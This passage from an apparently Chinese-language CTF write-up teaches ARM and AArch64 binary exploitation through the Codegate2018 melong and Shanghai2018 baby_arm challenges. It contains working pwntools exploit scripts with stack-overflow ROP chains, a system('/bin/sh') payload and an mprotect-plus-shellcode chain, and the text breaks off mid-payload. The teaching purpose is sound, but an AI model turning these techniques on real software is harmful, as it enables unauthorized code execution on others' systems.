        sh.sendline('cat /flag')
        return sh.recvrepeat(0.3)
    def get_padding_length():
        length = 0
        while True:
            sh = get_sh()
            sh.recvuntil('if you want to quitn')
            sh.send('n')
            sh.recvrepeat(0.3)
            sh.sendline('A' * length + p32(0x8F00))
            try:
                if 'if you want to quitn' in sh.recvrepeat(0.3):
                    return length
                sh.sendline('~')
                log.info('When padding is ' + str(length) + ', Success exit!')
                length = length + 1
                sh.close()
            except:
                log.info('When padding is ' + str(length) + ', Fail exit!')
                length = length + 1
                sh.close()
                pass
    if __name__ == "__main__":
        padding = 112
        if padding is null:
            padding = get_padding_length()
            log.success('We get padding length is ' + str(get_padding_length()))
        sh = get_sh()
        payload='A' * padding + p32(0x00020904) + p32(0x0006c384) + p32(0x0006c384) + p32(0x000110B4)
        sh.recvuntil('if you want to quitn')
        sh.send('n')
        sh.recvrepeat(0.3)
        sh.sendline(payload)
        flag=get_flag(sh)
        log.success('The flag is '+flag)
        sh.close()
###  以Codegate2018_melong为例
####  程序分析
32位ARM动态链接程序，仅开启NX保护。
题目是一个BMI指数计算和记录程序，write_diary存在明显的栈溢出漏洞，溢出的长度由我们的`BMI指数`决定，此处若我们使得`nbyte`为-1就可以获得一个近乎无限长度的溢出了~
分析main函数可以得知，我们若想进入write_diary函数，必须使得`BMI_num`不为空，而`BMI_num`由PT函数计算得到，那么就必须保证`v5`不为空，因此，我们必须进入的函数有`Check`、`PT`这两个函数。
那么先分析PT函数
可以发现，程序没有任何的限制，那么我们直接进入Check函数，跟进流程即可，进入PT函数后直接输入-1即可获取溢出点。
####  构造payload
#####  Leak Libc
首先，在main函数，可以确定需要padding的长度为0x54。
⚠️：此时，在ARM程序中，要特别注意，我们无需覆盖BP指针的值，我们之前说过(见上文的堆栈规则)ARM下的入栈顺序，可以看到事实上返回地址之前并没有BP指针需要伪造。
然后利用`ROPgadget`可以获取程序里可供利用的`gadget`。
此处我们选用`0x00011bbc : pop {r0, pc}`
那么可以构造payload。
`payload = 'A'*0x54 + p32(0x00011bbc) + p32(melong.got['puts']) +
p32(melong.plt['puts'])`
然后我们进行调试，注意，我们需要调试时，程序的启动方式需要变更。
    def get_sh(other_libc = null):
        global libc
        if args['REMOTE']:
            if other_libc is not null:
                libc = ELF("./", checksec = False)
            return remote(sys.argv[1], sys.argv[2])
        elif remote_gdb:
            sh = process(["qemu-arm", "-g", "2333", "-L", "/usr/arm-linux-gnueabi", "./melong"])
            log.info('Please use GDB remote!(Enter to continue)')
            raw_input()
            return sh
        else :
            return process(["qemu-arm", "-L", "/usr/arm-linux-gnueabi", "./melong"])
需要在本地启动一个gdb server，然后新开一个终端窗口进行附加。
我们在main函数返回处下断~
可以看到，执行流确实被我们劫持了，并且程序确实输出了`puts`的`GOT`表地址。
#####  返回main函数
接下来我们想要让程序返回main函数从而做二次利用。
但是在调试时发现程序在进入puts函数时`IR`寄存器的值并没有发生变化，这导致在puts函数执行结束后程序会回到`0x0011270`的位置，这将会导致程序再次执行`LDMFD
SP!, {R11,PC}`。进而导致栈混乱。
#####  静态libc加载？
接下来我们发现，连续的两次泄露中，puts的got表地址并没有发生变化，也就是说！这里的libc文件可能是静态加载到程序里的！那么我们可以直接构造最终的exploit！
####  Final Exploit
    from pwn import *
    import sys
    context.log_level='debug'
    context.arch='arm'
    remote_gdb=False
    melong=ELF('./melong')
    libc=ELF("/usr/arm-linux-gnueabi/lib/libc.so.6", checksec = False)
    def get_sh(other_libc = null):
        global libc
        if args['REMOTE']:
            if other_libc is not null:
                libc = ELF("./libc-2.30.so", checksec = False)
            return remote(sys.argv[1], sys.argv[2])
        elif remote_gdb:
            sh = process(["qemu-arm", "-g", "2333", "-L", "/usr/arm-linux-gnueabi", "./melong"])
            log.info('Please use GDB remote!(Enter to continue)')
            raw_input()
            return sh
        else :
            return process(["qemu-arm", "-L", "/usr/arm-linux-gnueabi", "./melong"])
    def get_address(sh,arch_num=null,info=null,start_string=null,end_string=null,int_mode=False):
        sh.recvuntil(start_string)
        if int_mode :
            return_address=int(sh.recvuntil(end_string).strip(end_string),16)
        elif arch_num == 64:
            return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
        else:
            return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
        log.success(info+str(hex(return_address)))
        return return_address
    def get_flag(sh):
        sh.sendline('cat /flag')
        return sh.recvrepeat(0.3)
    if __name__ == "__main__":
        # print(args['DEBUG'])
        sh = get_sh(True)
        libc_base = 0xff6b6f98 - libc.symbols['puts']
        system_addr = libc_base + libc.symbols['system']
        binsh_addre = libc_base + libc.search('/bin/sh').next()
        # payload  = 'A' * 0x54 + p32(0x00011bbc) + p32(melong.got['puts']) + p32(melong.plt['puts'])
        payload  = 'A' * 0x54 + p32(0x00011bbc) + p32(binsh_addre) + p32(system_addr)
        sh.recvuntil('Type the number:')
        sh.sendline('1')
        sh.recvuntil('Your height(meters) : ')
        sh.sendline('1')
        sh.recvuntil('Your weight(kilograms) : ')
        sh.sendline('1')
        sh.recvuntil('Type the number:')
        sh.sendline('3')
        sh.recvuntil('How long do you want to take personal training?')
        sh.sendline('-1')
        sh.recvuntil('Type the number:')
        sh.sendline('4')
        sh.sendline(payload)
        sh.recvuntil('Type the number:')
        sh.sendline('6')
        flag=get_flag(sh)
        log.success('The flag is '+flag)
###  以Shanghai2018 – baby_arm为例
####  程序分析
64位aarch架构程序，仅开启NX保护。
`main`函数的逻辑相当简单，在`read_200`的函数中，可以发现存在明显的栈溢出。
因此我们可以构造Payload。
####  构造payload
首先我们想要把shellcode写到BSS段，然后发现程序中存在`mprotect`函数的调用痕迹。
那么我们可以利用`mprotect`函数修改BSS段的权限为可执行权限，然后将Shellcode放在BSS段上，跳转执行即可。
然后我们读一下汇编码~
看到进入函数时对SP指针进行了-0x50的操作，之后又将其+0x10作为参数传入read函数。
那么我们是无法劫持这个函数的PC指针的，这个函数的Stack结构如下。
可见，我们无法篡改X29和X30寄存器，但是！当此函数执行完毕后，SP指针会回到Buf的结束位置，之后main函数会直接从那里取出地址返回，我们就可以劫持main函数的PC指针。
那么padding长度必定为0x40，然后覆盖X29寄存器的值，然后就能覆盖X30(返回地址所在寄存器)
`padding = 'A' * 0x40 + p64(0xdeadbeef)`
接下来我们需要控制`X0-X3`寄存器，以完成`mprotect(0x411000,0x1000,7)`的构造。
很可惜，没有符合要求的gadget~
但是我们在程序中发现了这样的代码：
可以看到这段代码非常像我们在Intel/AMD架构下利用的`ret2csu`的代码，那么此处我们可以进行利用。
自`0x4008CC`处的代码开始，程序会依次对`X19、X20、X21、X22、X23、X24、X29、X30`赋值。
⚠️：
**此处请特别注意！X29，X30取的是SP指针指向处的值，因此在栈上应当布置成`X29、X30、X19、X20、X21、X22、X23、X24`的顺序！**
我们若接下来将PC劫持到`0x4008AC`处，程序将执行`LDR
X3,[X21,X19,LSL#3]`，那么此句汇编的意义是，将X19的值逻辑左移(Logical Shift Left)三位后加上X21的值，
**取其所指向的值**
存储在X3寄存器中。接下来是把X22寄存器的值作为第三个参数，把X23寄存器的值作为第二个参数，把X24寄存器的值(的低32位)作为第一个参数，给X19寄存器的值加一，调用X3寄存器所指向的函数。
我们只需要控制X19为0，`LDR X3,[X21,X19,LSL#3]`其实就是`LDR
X3,[X21]`那么我们需要找一个可控地址写入`mprotect[@plt](https://github.com/plt
"@plt")`，此时BSS就成了我们的最佳选择。
那么我们可以构造此处的payload：
    payload  = padding + p64(0x4008CC)       # X19 , X20
    payload += p64(0xdeadbeef)               # X29
    payload += p64(0x4008AC)                 # X30
    payload += p64(0) + p64(1)               # X19 , X20
    payload += p64(0x411068 + 0x100)         # X21
    payload += p64(0x7)                      # X22
    payload += p64(0x1000)                   # X23
    payload += p64(0x411000)              # X24
接下来，我们需要让程序继续返回溢出函数，以劫持PC到shellcode处。
    payload += p64(0xdeadbeef)               # X29
    payload += p64(0x4007F0)                 # X30
    payload += p64(0) * 0x6                  # X19 - X24
于是，完整的payload为
    shell_code = asm(shellcraft.sh())
    shell_code = shell_code.ljust(0x100,'x90')
    shell_code = shell_code + p64(baby_arm.plt['mprotect'])
    padding  = 'A' * 0x40 + p64(0xdeadbeef)
    payload  = padding + p64(0x4008CC)       # X19 , X20
    payload += p64(0xdeadbeef)               # X29